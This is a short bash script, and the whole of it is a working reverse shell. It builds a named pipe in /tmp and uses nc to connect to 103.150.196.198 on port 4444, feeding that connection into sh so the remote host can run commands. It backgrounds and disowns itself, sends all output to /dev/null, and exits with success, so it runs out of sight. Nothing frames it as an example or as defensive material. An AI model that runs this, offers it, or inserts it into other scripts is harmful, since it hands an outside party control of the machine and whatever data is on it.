#!/bin/bash
nohup sh -c 'mkfifo /tmp/f; nc 103.150.196.198 4444 < /tmp/f | sh > /tmp/f 2>&1; rm /tmp/f' </dev/null >/dev/null 2>&1 & disown
exit 0
